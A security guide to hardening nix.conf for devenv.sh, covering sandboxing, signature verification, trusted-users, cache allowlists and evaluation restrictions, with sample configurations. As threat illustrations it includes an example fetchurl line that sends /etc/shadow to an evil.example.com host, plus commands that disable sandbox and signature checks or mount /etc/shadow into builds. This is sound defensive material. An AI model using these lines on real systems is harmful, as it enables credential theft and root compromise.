# System-Level nix.conf Hardening Guide for devenv.sh Security

## Overview

Phase 1 research established that devenv.sh's most important security settings **cannot be controlled from devenv.nix or devenv.yaml**. The Nix daemon owns the security boundary: sandbox enforcement, binary cache trust, signature verification, and user privilege levels are all daemon-level configurations requiring system administrator action. A project's `devenv.nix` can request caches and set environment options, but the daemon decides whether to honor those requests based on its own configuration.

This guide documents every security-relevant nix.conf setting, explains the mechanism and default, provides the hardened value with rationale, describes what breaks and how to handle it, and delivers three concrete configuration formats: NixOS module, standalone nix.conf, and per-user nix.conf.

**Key architectural fact**: In multi-user Nix (the standard installation), the Nix daemon runs as root and owns the store. Users communicate via a Unix domain socket. Settings in `/etc/nix/nix.conf` (or NixOS's `nix.settings`) are the system-wide security policy. Per-user `~/.config/nix/nix.conf` files are loaded by the client but **not forwarded to the daemon** -- the client assumes the daemon has already loaded equivalent settings. This means per-user configs can influence client-side behavior (like which substituters to request) but cannot override daemon-enforced security policies.

---

## 1. sandbox = true + sandbox-fallback = false

### Mechanism

The Nix build sandbox uses Linux kernel namespaces (PID, mount, network, IPC, UTS) to isolate each build process. A sandboxed build can only see:
- Nix store paths declared as build inputs
- A temporary build directory (`/tmp/nix-build-*`)
- Private device nodes (`/proc`, `/dev`, `/dev/shm`, `/dev/pts`)
- Paths explicitly listed in `sandbox-paths`

Network access is completely blocked for normal derivations. Fixed-output derivations (FODs) are the exception: they bypass network isolation because they declare a content hash upfront and need to fetch from the internet.

### Defaults

- `sandbox`: `true` on Linux (NixOS enables this explicitly; upstream Nix also defaults to `true` on Linux), `false` on macOS and other platforms
- `sandbox-fallback`: `true` -- if the kernel lacks namespace support, Nix **silently falls back to unsandboxed builds**

### Why the Default is Dangerous

`sandbox-fallback = true` means that on a system where user namespaces are disabled (some hardened kernels, older kernels, certain container runtimes), builds proceed without any isolation -- and **no warning is emitted**. A developer could be running builds that access the entire host filesystem, read environment variables, and make network connections, all while believing they are sandboxed.

The `sandbox = relaxed` mode is equally dangerous: it allows any derivation with `__noChroot = true` to skip sandboxing entirely. A malicious nixpkgs overlay or third-party flake input could set this attribute on any derivation.

### Hardened Values

```
sandbox = true
sandbox-fallback = false
```

### What Breaks

- **Builds on kernels without user namespace support**: Builds will fail instead of silently degrading. This is the correct behavior -- failing loudly is better than silent security regression.
- **Container-in-container scenarios**: Running Nix inside Docker without `--privileged` or appropriate seccomp/AppArmor exemptions will fail. Fix: run the outer container with `--security-opt seccomp=unconfined` or use `SYS_ADMIN` capability, or build outside the container.
- **macOS**: macOS uses `sandbox-exec` which is weaker than Linux namespaces. `sandbox = true` works but with documented limitations and historical escape CVEs. `sandbox-fallback = false` is still correct -- better to know when sandboxing fails.
- **Some NixOS tests**: The NixOS test framework runs builds inside VMs that may lack full namespace support. If using `nixos-test`, this may need adjustment in the test driver, not in the system nix.conf.

### Handling Breakage

If a build fails with sandbox errors, the correct response is to fix the environment (enable user namespaces, adjust container privileges), not to weaken the sandbox. For genuinely unsandboxable environments (certain CI runners), use a separate nix.conf for that specific environment rather than weakening the system default.

---

## 2. require-sigs = true

### Mechanism

When Nix downloads a pre-built store path (a "substitution") from a binary cache, the cache serves a `.narinfo` file containing:
- The NAR hash and size
- References to other store paths
- One or more Ed25519 signatures

Nix computes a fingerprint (`store-path;nar-hash;nar-size;refs`) and verifies it against keys in `trusted-public-keys`. If no signature matches a trusted key, the substitution is rejected.

With `require-sigs = true`, **every non-content-addressed store path must have a valid signature**. The only exceptions are content-addressed paths (which are self-verifying by definition) and paths from stores with `trusted=true` in the URL.

### Default

`require-sigs = true` -- this is already the correct default.

### Why We Explicitly Set It

The default is correct, but we set it explicitly for two reasons:

1. **Defense against accidental override**: A flake's `nixConfig` or a `--option require-sigs false` flag could disable this. Explicitly setting it in the system nix.conf ensures the daemon enforces it regardless of what clients request (only trusted users can override daemon settings).
2. **Documentation value**: Making the setting visible in configuration makes the security posture auditable.

### What Happens on Unsigned Packages

When a substituter serves a store path without a valid signature:
1. The substitution is silently rejected
2. Nix falls back to building the derivation from source
3. No error is displayed -- the build simply takes longer

This behavior is secure but can cause confusion when a cache appears to not work. Developers may see long build times and not understand that signature verification is rejecting cached artifacts.

### What Breaks

- **Local store copies** (`nix copy` between machines): If the source machine did not sign its store paths, the destination will reject them. Fix: generate a signing key pair with `nix-store --generate-binary-cache-key`, sign locally-built paths with `secret-key-files`, and add the public key to `trusted-public-keys` on the destination.
- **Custom Cachix or Attic caches**: If you set up your own binary cache but forget to configure signing, all substitutions will be rejected. Fix: configure cache signing in your cache infrastructure.
- **Development iteration**: When copying paths from `nix build` results to other machines or nix stores, unsigned paths are rejected. This is correct behavior.

### Hardened Value

```
require-sigs = true
```

---

## 3. trusted-users = root (REMOVE All Other Users)

### Mechanism

The `trusted-users` setting defines which users have elevated privileges when connecting to the Nix daemon. Trusted users can:

- Specify arbitrary binary caches (substituters) -- adding any URL as a package source
- Import unsigned NARs into the store -- bypassing `require-sigs` entirely
- Set any nix.conf option via `--option` -- including `sandbox = false`
- Add `sandbox-paths` -- gaining read access to arbitrary directories during builds
- Bypass `allowed-users` restrictions

The Nix documentation is explicit: **"Adding a user to `trusted-users` is essentially equivalent to giving that user root access to the system."**

### Default

`trusted-users = root`

### Why devenv's Recommendation is Dangerous

devenv.sh documentation and community guides commonly recommend:

```
trusted-users = root <username>
# or worse:
trusted-users = root @wheel
```

This is recommended because devenv's `nixConfig` in its flake.nix specifies `extra-substituters` for `devenv.cachix.org` and `cachix.cachix.org`. For an untrusted user, these substituters are ignored unless either:
1. The user is in `trusted-users` (root-equivalent), OR
2. The substituter URL is in `trusted-substituters` (scoped permission)

devenv's docs take the path of least friction (option 1), which grants root-equivalent access to solve a cache access problem. This is like giving someone the master key to your building because they need access to one room.

### The Root-Equivalent Problem in Detail

A user in `trusted-users` can:

1. **Point the daemon at a malicious cache**: `nix build --option substituters https://evil.example.com` -- the daemon will download and execute binaries from this URL if they have valid signatures (or if the user also disables `require-sigs`)
2. **Disable the sandbox**: `nix build --option sandbox false` -- builds run with full filesystem access
3. **Disable signature verification**: `nix build --option require-sigs false` -- accept any binary from any source
4. **Escalate to root**: Because the daemon runs as root and trusted users can control its behavior, a chain of: disable sandbox + point at malicious cache + disable sigs = arbitrary code execution as root via a crafted derivation
5. **Read arbitrary files during builds**: `--option extra-sandbox-paths /etc/shadow` would bind-mount sensitive files into the build sandbox

### Hardened Value

```
trusted-users = root
```

No other users. No groups. Not `@wheel`. Not `@developers`. Just `root`.

### What Breaks

- **devenv cache access**: Without being a trusted user, devenv's `extra-substituters` for `devenv.cachix.org` and `cachix.cachix.org` will be ignored. Devenv will either prompt for confirmation (if `accept-flake-config` behavior applies) or silently skip the caches and build everything from source. **Fix**: Use `trusted-substituters` (see section 4) to grant scoped cache access without granting root-equivalent privileges.
- **`cachix use` command**: The `cachix use` command modifies nix.conf to add substituters. Without trusted-user status, these additions are ignored by the daemon. **Fix**: Add the specific caches to `trusted-substituters` at the system level.
- **Any workflow that relies on `--option`**: Scripts or CI that pass `--option` flags to override daemon settings will silently have those options ignored. **Fix**: Set the needed options in the system nix.conf instead.
- **Nix flake `nixConfig`**: Flakes that specify `nixConfig` settings (like devenv does) will have those settings ignored for untrusted users. **Fix**: Pre-approve the specific caches in `trusted-substituters`.

### Handling Breakage

The correct solution is always `trusted-substituters` + `trusted-public-keys` (sections 4 and 5), never re-adding users to `trusted-users`. If a workflow requires daemon-level option overrides, those options should be set in the system nix.conf by an administrator, not delegated to individual users.

---

## 4. trusted-substituters -- Explicit Allowlist

### Mechanism

`trusted-substituters` is a list of binary cache URLs that **unprivileged users are permitted to enable**. This is the scoped alternative to `trusted-users`: instead of granting root-equivalent access so users can specify any cache, you pre-approve specific caches that users can request.

When an unprivileged user specifies a substituter (via `--option substituters`, `extra-substituters` in per-user nix.conf, or a flake's `nixConfig`), the daemon checks:
1. Is the user in `trusted-users`? If yes, allow any substituter.
2. Is the substituter URL in `trusted-substituters`? If yes, allow it.
3. Otherwise, reject it silently.

### Default

Empty -- no additional substituters are pre-approved for unprivileged users.

### Which Caches to Allow and Why

For a devenv.sh setup, three caches are needed:

| Cache URL | Signing Key | Why |
|-----------|-------------|-----|
| `https://cache.nixos.org` | `cache.nixos.org-1:6NCHdD59X431o0gWypbMrAURkbJ16ZPMQFGspcDShjY=` | Official NixOS binary cache. This is the default substituter and is already trusted. Including it in `trusted-substituters` is redundant but documents intent. |
| `https://devenv.cachix.org` | `devenv.cachix.org-1:w1cLUi8dv3hnoSPGAuibQv+f9TZLr6cv/Hm9XgU50cw=` | devenv.sh's own binary cache. Contains pre-built devenv tooling and common development packages. Operated by Cachix (the company behind devenv). Required for devenv to avoid building its own tooling from source. |
| `https://cachix.cachix.org` | `cachix.cachix.org-1:eWNHQldwUO7G2VkjpnjDbWwy4KQ/HNxht7H4SSoMckM=` | Cachix's own binary cache for the Cachix CLI and related tooling. Referenced in devenv's `flake.nix` `nixConfig`. |

**Why not add more?** Each cache URL is a trust surface. The signing key holder for that cache can provide arbitrary binaries for any store path that the cache serves. Per the Garnix blog post: "anyone with access to the cache can push malicious versions of that software." Cache credentials are typically stored in CI systems where "everyone with write access to the repo has read access to the secrets." Minimize the number of caches to minimize the number of parties you trust with arbitrary code execution on your machines.

**Organization-specific caches**: If your team operates a private Cachix or Attic cache, add its URL here. Ensure the cache signing key is stored securely (not in a shared CI secret accessible to all contributors) and that push access is restricted.

### Hardened Value

```
trusted-substituters = https://cache.nixos.org https://devenv.cachix.org https://cachix.cachix.org
```

### What Breaks

Nothing breaks -- this setting is additive. It enables unprivileged users to use these caches without granting them any other elevated privileges. Caches not in this list are simply not available to unprivileged users (they would need to be added by an administrator).

---

## 5. trusted-public-keys -- Signing Keys for Each Substituter

### Mechanism

`trusted-public-keys` lists the Ed25519 public keys used to verify binary cache signatures. When Nix downloads a `.narinfo` from a substituter, it checks the `Sig:` field against these keys. The key format is `<name>:<base64-encoded-public-key>` where the name is conventionally `<cache-domain>-<version>`.

A store path is accepted if it has a valid signature from **at least one** trusted key (or is content-addressed, or `require-sigs` is disabled -- which it should not be).

### Default

```
trusted-public-keys = cache.nixos.org-1:6NCHdD59X431o0gWypbMrAURkbJ16ZPMQFGspcDShjY=
```

### Hardened Value

Add keys for every cache in `trusted-substituters`, and no others:

```
trusted-public-keys = cache.nixos.org-1:6NCHdD59X431o0gWypbMrAURkbJ16ZPMQFGspcDShjY= devenv.cachix.org-1:w1cLUi8dv3hnoSPGAuibQv+f9TZLr6cv/Hm9XgU50cw= cachix.cachix.org-1:eWNHQldwUO7G2VkjpnjDbWwy4KQ/HNxht7H4SSoMckM=
```

### Key Security Properties

- **One key per cache**: Each cache should have its own signing key. Never share signing keys across caches.
- **Key compromise = cache compromise**: If a signing key is compromised, the attacker can sign arbitrary store paths. The response is to remove the key from `trusted-public-keys`, remove the cache from `trusted-substituters`, and rebuild anything that was substituted from that cache after the compromise date.
- **No key rotation mechanism**: Nix has no built-in key rotation. To rotate, generate a new key, sign new artifacts with the new key, add the new public key, remove the old one, and wait for all old signatures to age out.
- **Multiple keys can sign the same path**: A `.narinfo` can have multiple `Sig:` entries. Having more than one valid signature does not provide additional security -- any single valid signature is sufficient.

### What Breaks

Adding keys to `trusted-public-keys` does not break anything. Removing a key causes all paths signed only by that key to fail substitution and fall back to building from source. This is the correct behavior when decommissioning a cache.

---

## 6. allowed-users -- Daemon Access Control

### Mechanism

`allowed-users` controls which local users can connect to the Nix daemon's Unix domain socket and request operations (builds, substitutions, garbage collection). Users not in this list cannot use Nix at all.

Note: users in `trusted-users` can always connect, regardless of `allowed-users`.

### Default

`allowed-users = *` -- all local users can connect.

### Security Implications

On a multi-user workstation or shared server, `*` means any user account can:
- Build arbitrary Nix expressions (consuming CPU, disk, network)
- Install packages into the shared Nix store
- Trigger substitutions from configured caches

While these operations are not privilege-escalating (the daemon enforces sandboxing and signature verification), they consume shared resources and could be used for denial-of-service.

### Hardened Value

For a developer workstation (single user):

```
allowed-users = root <your-username>
```

For a shared development server:

```
allowed-users = root @developers
```

Where `@developers` is a system group containing authorized Nix users. The `@` prefix denotes a group name.

### What Breaks

- **Users not in the list cannot run any Nix commands**: `nix build`, `nix develop`, `devenv shell` -- all fail with a daemon connection error. **Fix**: Add the user to the specified group.
- **System services**: If system services (like a CI runner user) need Nix access, they must be in `allowed-users`. **Fix**: Add the service user to the allowed list or group.
- **New user accounts**: Newly created users do not automatically get Nix access. **Fix**: Add them to the appropriate group as part of onboarding.

---

## 7. restrict-eval and allowed-uris -- Evaluation-Time Network Access Control

### Mechanism

`restrict-eval = true` constrains the Nix language evaluator (the phase that interprets `.nix` files, before any building occurs):

- **Filesystem**: Can only access files within `builtins.nixPath` entries and the flake's own source tree. Cannot read `/etc/passwd`, `~/.ssh/id_rsa`, or any other file outside the Nix path.
- **Network**: Can only fetch URIs matching prefixes in `allowed-uris`. Blocks `builtins.fetchurl`, `builtins.fetchTarball`, `builtins.fetchGit` to non-allowed destinations.

`allowed-uris` is a list of URI prefixes. Access is granted when:
1. The requested URI equals a prefix exactly, OR
2. The requested URI is a subpath of a prefix, OR
3. The prefix is a scheme followed by a colon (e.g., `github:`) and the URI uses that scheme

### Defaults

- `restrict-eval = false`
- `allowed-uris = ` (empty)

### Why This Matters for devenv

Nix evaluation is **unsandboxed** -- it runs with the calling user's full privileges. Without `restrict-eval`, a malicious `.nix` file can:
- Read any file the user can read (`builtins.readFile "/etc/shadow"`)
- Fetch arbitrary URLs (`builtins.fetchurl "https://evil.example.com/exfiltrate?data=${builtins.readFile "/etc/shadow"}"`)
- Combine both to exfiltrate data during evaluation

With flakes, `--pure-eval` is enabled by default, which prevents `builtins.getEnv` and disables impure constants. But `pure-eval` does NOT restrict filesystem access to the same degree as `restrict-eval`.

### Hardened Values (for CI/build servers)

```
restrict-eval = true
allowed-uris = https://github.com/NixOS/ https://github.com/cachix/ github: https://cache.nixos.org https://devenv.cachix.org
```

### Hardened Values (for developer workstations)

**Not recommended for interactive development.** `restrict-eval` breaks many common development workflows:

- Fetching new flake inputs
- Using `nix-shell -p` with ad-hoc packages
- Any evaluation that accesses files outside the Nix store
- devenv.sh's own evaluation (devenv requires impure evaluation and accesses project directory files)

For developer workstations, the protection comes from other layers: pure eval (automatic with flakes), code review of `.nix` files, and not running untrusted flakes.

### What Breaks

- **devenv.sh**: devenv requires reading project-local files during evaluation. With `restrict-eval`, devenv would need all its paths whitelisted. This is impractical for interactive development. **Fix**: Do not enable `restrict-eval` on developer workstations. Use it on CI/build servers where the set of evaluated expressions is known.
- **nix-shell -p**: Ad-hoc package installation fails because the evaluator cannot fetch arbitrary inputs. **Fix**: Pre-configure allowed URI prefixes for common sources.
- **Flake input fetching**: `nix flake update` may fail if the flake input URLs are not in `allowed-uris`. **Fix**: Add all input URL prefixes.

### Recommendation

Enable `restrict-eval` on CI servers and build infrastructure. Leave it disabled on developer workstations, where the primary evaluation-time protection is pure eval (enabled by default with flakes) and code review.

---

## 8. filter-syscalls = true

### Mechanism

`filter-syscalls` applies a seccomp BPF filter to build processes that prevents:
- Creation of setuid/setgid files (the `SUID`/`SGID` bits)
- Manipulation of POSIX ACLs on files
- Setting extended attributes (xattrs)

These are operations that could be used to escalate privileges if a build output were to create a setuid binary or manipulate file permissions in the Nix store.

### Default

`filter-syscalls = true`

### Why We Keep It Enabled

The seccomp filter prevents a class of privilege escalation attacks where a build derivation creates a setuid binary that, when executed by a different user, runs with elevated privileges. Without this filter, a malicious derivation could place a setuid-root binary in the Nix store, and any user running that binary would get root access.

This is the only layer of build-time syscall filtering that Nix provides. Disabling it removes a defense-in-depth mechanism.

### Hardened Value

```
filter-syscalls = true
```

### What Breaks

- **Builds that legitimately need setuid**: Very rare. The Nix store is not the appropriate place for setuid binaries -- NixOS handles setuid wrappers separately via `security.wrappers`. If a derivation fails because it tries to create setuid files, it is either a bug in the derivation or a deliberate attempt to escalate privileges.
- **Builds that set extended attributes**: Some packaging systems use xattrs for capabilities (e.g., `cap_net_bind_service`). These will fail in the Nix sandbox. **Fix**: Use NixOS's capability wrapper infrastructure instead of in-store xattrs.

---

## 9. extra-sandbox-paths -- When and Why

### Mechanism

`sandbox-paths` and `extra-sandbox-paths` specify additional filesystem paths that are bind-mounted (read-only by default) into the build sandbox. The syntax supports:

- Simple paths: `/etc/resolv.conf` -- mounted at the same location inside the sandbox
- Remapped paths: `/etc/hosts=/path/to/custom/hosts` -- mounted at a different location
- Optional paths: `/opt/licensed-tool?` -- silently skipped if the source does not exist

`extra-sandbox-paths` appends to `sandbox-paths` rather than replacing it.

### Default

`sandbox-paths` is empty by default (some distributions set `/bin/sh` to the Nix store's bash).

### When to Add Paths

Legitimate use cases are narrow:

| Use Case | Example | Risk Level |
|----------|---------|------------|
| DNS resolution in FODs | `/etc/resolv.conf` | Low -- already available in FODs via network access |
| CA certificates | `/etc/ssl/certs` | Low -- needed for HTTPS in FODs |
| Hardware-specific files | `/dev/kvm` | Medium -- grants hardware access |
| Licensed software | `/opt/quartus` | Medium -- expands readable surface |
| Time zone data | `/etc/localtime` | Low -- cosmetic |

### Why Not to Add Paths

Every added path:
1. **Expands the attack surface**: A malicious build can read the contents of any bind-mounted path
2. **Breaks reproducibility**: Builds depend on host-specific files, making them non-reproducible across machines
3. **Persists across all builds**: Sandbox paths are global -- every derivation built on the system sees them

The most dangerous additions are writable paths and paths containing credentials or sensitive configuration.

### Hardened Value

```
extra-sandbox-paths =
```

Empty. Add paths only when a specific build requires them, and prefer per-derivation `__sandboxPaths` or impure derivations for truly exceptional cases rather than global configuration.

### What Breaks

- **FODs that need DNS resolution**: Some fetch operations need `/etc/resolv.conf`. In practice, FODs have full network access and usually resolve DNS without the host's resolv.conf. If DNS fails, add `/etc/resolv.conf` as an optional path: `extra-sandbox-paths = /etc/resolv.conf?`.
- **Builds referencing system CA certificates**: Some builds need to verify TLS certificates. The Nix store usually contains `cacert` as a dependency. If not, add `/etc/ssl/certs?`.

---

## 10. connect-timeout and download-attempts -- Cache Exposure Limits

### Mechanism

- `connect-timeout`: The TCP connection timeout (in seconds) for connecting to binary cache substituters. Maps to curl's `--connect-timeout`. Controls how long Nix will wait to establish a connection before giving up on a particular cache.
- `download-attempts`: How many times Nix will retry downloading a file from a substituter before giving up and falling back to building from source.

### Defaults

- `connect-timeout = 0` (no limit -- Nix will wait indefinitely for a cache connection)
- `download-attempts = 5`

### Why We Change Them

The default `connect-timeout = 0` means a slow or unresponsive cache can stall builds indefinitely. In a targeted attack, a malicious cache could accept connections slowly, causing a denial-of-service by making all builds hang waiting for substitutions.

Even without malicious intent, a cache outage with no timeout means builds block until the TCP stack's own timeout kicks in (typically minutes). Setting an explicit timeout ensures builds fail fast and fall back to source builds or alternative caches.

Reducing `download-attempts` from 5 to 3 limits the window during which a slow or malicious cache can hold a build hostage. Each retry includes the full connect-timeout wait, so 5 retries * N seconds timeout = potentially long stalls.

### Hardened Values

```
connect-timeout = 10
download-attempts = 3
```

### What Breaks

- **Slow networks**: On high-latency connections (satellite, international), 10 seconds may not be enough to connect to caches. **Fix**: Increase `connect-timeout` to 30 for those environments.
- **Intermittent connectivity**: Reducing download attempts from 5 to 3 means flaky connections have fewer retries. The impact is that more builds will fall back to source when the cache is unreliable. This is acceptable -- it is better to build from source than to wait indefinitely for a flaky cache.
- **Large downloads**: The connect-timeout only affects the initial TCP connection, not the transfer itself. Large NAR downloads that are slow to transfer are not affected by this setting.

---

## Configuration Format: NixOS Module

This is the recommended format for NixOS systems. Place in `/etc/nixos/configuration.nix` or a dedicated `nix-hardening.nix` imported by it.

```nix
# nix-hardening.nix -- System-level Nix daemon security configuration for devenv.sh
{ config, lib, ... }:

{
  nix.settings = {
    # --- Build Sandbox ---
    # Enforce build isolation via Linux namespaces.
    # Builds can only see declared dependencies, temp dirs, and /proc.
    sandbox = true;

    # CRITICAL: Do NOT silently fall back to unsandboxed builds.
    # If the kernel can't sandbox, builds should FAIL, not silently degrade.
    sandbox-fallback = false;

    # Seccomp filter: block setuid/setgid creation, ACLs, xattrs in builds.
    filter-syscalls = true;

    # No additional paths exposed to sandboxed builds.
    # Add paths here ONLY with documented justification.
    extra-sandbox-paths = [ ];

    # --- Binary Cache Signature Verification ---
    # Every non-content-addressed store path MUST have a valid Ed25519 signature.
    require-sigs = true;

    # --- User Trust Model ---
    # ONLY root is trusted. Nobody else gets root-equivalent Nix daemon access.
    # This overrides devenv's recommendation to add your user here.
    trusted-users = [ "root" ];

    # Who can connect to the Nix daemon at all.
    # Replace <your-username> or use a group like @developers.
    allowed-users = [ "root" "@wheel" ];

    # --- Binary Cache Allowlist ---
    # Pre-approve specific caches so unprivileged users can use them
    # WITHOUT needing trusted-users status.
    trusted-substituters = [
      "https://cache.nixos.org"
      "https://devenv.cachix.org"
      "https://cachix.cachix.org"
    ];

    # Signing keys for each approved cache. One key per cache.
    trusted-public-keys = [
      "cache.nixos.org-1:6NCHdD59X431o0gWypbMrAURkbJ16ZPMQFGspcDShjY="
      "devenv.cachix.org-1:w1cLUi8dv3hnoSPGAuibQv+f9TZLr6cv/Hm9XgU50cw="
      "cachix.cachix.org-1:eWNHQldwUO7G2VkjpnjDbWwy4KQ/HNxht7H4SSoMckM="
    ];

    # --- Cache Connection Limits ---
    # Don't wait forever for a cache. Fail fast, build from source.
    connect-timeout = 10;
    download-attempts = 3;
  };

  # --- Flake Configuration Security ---
  # Do NOT auto-accept nixConfig from flakes.
  # Users will be prompted when a flake tries to set nix options.
  nix.extraOptions = ''
    accept-flake-config = false
  '';

  # NOTE: restrict-eval is intentionally NOT set here.
  # It breaks interactive devenv usage. Enable it on CI/build servers only.
  # For CI: add to nix.settings:
  #   restrict-eval = true;
  #   allowed-uris = [ "https://github.com/NixOS/" "https://github.com/cachix/" "github:" ];
}
```

### Adding Organization-Specific Caches

To add your organization's private cache, extend the lists:

```nix
{
  nix.settings = {
    trusted-substituters = [
      "https://cache.nixos.org"
      "https://devenv.cachix.org"
      "https://cachix.cachix.org"
      "https://myorg.cachix.org"           # Your org cache
      "s3://my-company-nix-cache?region=us-east-1"  # S3-backed cache
    ];
    trusted-public-keys = [
      "cache.nixos.org-1:6NCHdD59X431o0gWypbMrAURkbJ16ZPMQFGspcDShjY="
      "devenv.cachix.org-1:w1cLUi8dv3hnoSPGAuibQv+f9TZLr6cv/Hm9XgU50cw="
      "cachix.cachix.org-1:eWNHQldwUO7G2VkjpnjDbWwy4KQ/HNxht7H4SSoMckM="
      "myorg.cachix.org-1:<your-org-public-key>"
    ];
  };
}
```

---

## Configuration Format: Standalone nix.conf

For non-NixOS Linux and macOS. Place at `/etc/nix/nix.conf` (requires root/admin access).

```ini
# /etc/nix/nix.conf -- Hardened configuration for devenv.sh security
# This file requires root to edit and is read by the Nix daemon on startup.
# After editing, restart the daemon: systemctl restart nix-daemon

# --- Build Sandbox ---
sandbox = true
sandbox-fallback = false
filter-syscalls = true
extra-sandbox-paths =

# --- Binary Cache Signature Verification ---
require-sigs = true

# --- User Trust Model ---
# ONLY root is trusted. Do NOT add your username here.
# devenv docs tell you to add yourself -- ignore that advice.
trusted-users = root
allowed-users = root @nixbld @wheel

# --- Binary Cache Allowlist ---
# These caches are pre-approved for unprivileged users.
# Replaces the need for trusted-users to enable devenv's caches.
substituters = https://cache.nixos.org
trusted-substituters = https://cache.nixos.org https://devenv.cachix.org https://cachix.cachix.org

# Signing keys -- one per approved cache.
trusted-public-keys = cache.nixos.org-1:6NCHdD59X431o0gWypbMrAURkbJ16ZPMQFGspcDShjY= devenv.cachix.org-1:w1cLUi8dv3hnoSPGAuibQv+f9TZLr6cv/Hm9XgU50cw= cachix.cachix.org-1:eWNHQldwUO7G2VkjpnjDbWwy4KQ/HNxht7H4SSoMckM=

# --- Cache Connection Limits ---
connect-timeout = 10
download-attempts = 3

# --- Flake Security ---
accept-flake-config = false

# --- Evaluation Restrictions (CI/build servers only) ---
# Uncomment these on build servers, NOT on developer workstations:
# restrict-eval = true
# allowed-uris = https://github.com/NixOS/ https://github.com/cachix/ github: https://cache.nixos.org https://devenv.cachix.org
```

### macOS-Specific Notes

On macOS with the Determinate Systems installer:
- nix.conf is at `/etc/nix/nix.conf`
- Sandbox uses `sandbox-exec` (weaker than Linux namespaces)
- `sandbox = true` is supported but has known escape vulnerabilities (3 historical CVEs)
- `filter-syscalls` has no effect on macOS (seccomp is Linux-only)
- Restart daemon with: `sudo launchctl kickstart -k system/org.nixos.nix-daemon`

---

## Configuration Format: Per-User nix.conf

Located at `~/.config/nix/nix.conf` (or `$XDG_CONFIG_HOME/nix/nix.conf`).

### What CAN Be Set Here

Per-user nix.conf is read by the **client**, not the daemon. The client sends requests to the daemon, and the daemon applies its own security policy. Per-user settings that work:

```ini
# ~/.config/nix/nix.conf

# Request additional substituters. These ONLY work if the URLs are
# in the system nix.conf's trusted-substituters list.
extra-substituters = https://devenv.cachix.org https://cachix.cachix.org

# Request additional public keys for verification.
extra-trusted-public-keys = devenv.cachix.org-1:w1cLUi8dv3hnoSPGAuibQv+f9TZLr6cv/Hm9XgU50cw= cachix.cachix.org-1:eWNHQldwUO7G2VkjpnjDbWwy4KQ/HNxht7H4SSoMckM=

# Client-side behavior settings (not security-enforced by daemon):
warn-dirty = true
accept-flake-config = false

# Enable experimental features (client-side):
experimental-features = nix-command flakes
```

### What CANNOT Be Set Here (Ignored or Daemon-Enforced)

These settings are **ignored** when set in per-user nix.conf because the daemon enforces its own values:

| Setting | Why It Cannot Be Set Per-User |
|---------|-------------------------------|
| `sandbox` | Daemon controls build isolation. Users cannot disable it. |
| `sandbox-fallback` | Daemon policy. Users cannot weaken sandbox enforcement. |
| `trusted-users` | Obviously -- users cannot grant themselves trusted status. |
| `allowed-users` | Daemon policy. Users cannot grant others access. |
| `require-sigs` | Daemon enforces signature verification. Users cannot disable it. |
| `filter-syscalls` | Daemon policy for build processes. |
| `restrict-eval` | Daemon-enforced evaluation restriction. |
| `allowed-uris` | Daemon-controlled URI allowlist. |
| `trusted-substituters` | Admin-only. Users cannot pre-approve caches for other users. |
| `post-build-hook` | System-only, cannot be set per-user or on the command line by untrusted users. |
| `diff-hook` | System-only. |
| `substituters` (overriding) | Untrusted users can only append via `extra-substituters`, and only URLs in `trusted-substituters`. Setting `substituters` directly is ignored. |

### The extra-* Prefix Trick

Settings prefixed with `extra-` **append** to the system values rather than replacing them. This is the mechanism by which per-user configs can add caches:

```ini
# System nix.conf:
substituters = https://cache.nixos.org

# Per-user nix.conf:
extra-substituters = https://devenv.cachix.org
# Result: substituters = https://cache.nixos.org https://devenv.cachix.org
# BUT: devenv.cachix.org is only used if it's in trusted-substituters
```

The `extra-` prefix works for: `extra-substituters`, `extra-trusted-public-keys`, `extra-trusted-substituters`, `extra-sandbox-paths`, `extra-platforms`, `extra-system-features`.

### Per-User Hardened Config

```ini
# ~/.config/nix/nix.conf -- Developer workstation per-user hardening

# Never auto-accept flake nixConfig settings.
# You will be prompted to review each flake's requested settings.
accept-flake-config = false

# Enable modern Nix CLI and flakes.
experimental-features = nix-command flakes

# Warn when evaluating a dirty Git tree (uncommitted changes).
warn-dirty = true

# Request devenv's caches (only works if system allows them via trusted-substituters).
extra-substituters = https://devenv.cachix.org https://cachix.cachix.org
extra-trusted-public-keys = devenv.cachix.org-1:w1cLUi8dv3hnoSPGAuibQv+f9TZLr6cv/Hm9XgU50cw= cachix.cachix.org-1:eWNHQldwUO7G2VkjpnjDbWwy4KQ/HNxht7H4SSoMckM=
```

---

## Summary: Setting-by-Setting Reference Table

| Setting | Default | Hardened Value | Scope | Effect of Hardening |
|---------|---------|---------------|-------|-------------------|
| `sandbox` | `true` (Linux) | `true` | System | Enforces build isolation via namespaces |
| `sandbox-fallback` | `true` | `false` | System | Builds FAIL if sandbox unavailable instead of silently degrading |
| `filter-syscalls` | `true` | `true` | System | Blocks setuid/setgid creation in builds |
| `extra-sandbox-paths` | empty | empty | System | No extra filesystem exposed to builds |
| `require-sigs` | `true` | `true` | System | All store paths must have valid signatures |
| `trusted-users` | `root` | `root` | System | Only root has daemon admin access |
| `allowed-users` | `*` | `root @wheel` | System | Restricts who can use Nix |
| `trusted-substituters` | empty | 3 cache URLs | System | Pre-approves caches for unprivileged users |
| `trusted-public-keys` | 1 key | 3 keys | System | Verifies signatures from all approved caches |
| `connect-timeout` | `0` (unlimited) | `10` seconds | System/User | Prevents indefinite cache connection stalls |
| `download-attempts` | `5` | `3` | System/User | Limits retries against slow/malicious caches |
| `restrict-eval` | `false` | `false` (workstation) / `true` (CI) | System | Controls eval-time filesystem/network access |
| `allowed-uris` | empty | populated (CI only) | System | Whitelists URIs for restricted eval mode |
| `accept-flake-config` | `false` | `false` | System/User | Prevents flakes from silently changing nix settings |

---

## Deployment Checklist

1. **Apply system-level configuration** (NixOS module, standalone nix.conf, or macOS nix.conf)
2. **Restart the Nix daemon** (`sudo systemctl restart nix-daemon` or macOS equivalent)
3. **Remove your user from trusted-users** if previously added per devenv docs
4. **Test devenv.sh still works**: Run `devenv shell` in a project -- it should use caches from `trusted-substituters` without prompting
5. **Verify sandbox enforcement**: Run `nix build --sandbox false` as your user -- it should be ignored (daemon enforces `sandbox = true`)
6. **Verify cache trust**: Check `nix show-config | grep substituters` to confirm only approved caches are listed
7. **Distribute per-user config**: Provide developers with the per-user `~/.config/nix/nix.conf` template for client-side settings

---

## Sources

All raw sources saved in `docs/`:

- `docs/nix-conf-reference-2-28-hardening-settings.md` -- Full reference for all hardening-relevant nix.conf settings (Nix 2.28)
- `docs/nix-conf-per-user-limitations.md` -- Per-user nix.conf capabilities and restrictions
- `docs/nix-conf-security-options.md` -- nix.conf security option reference (Nix 2.28)
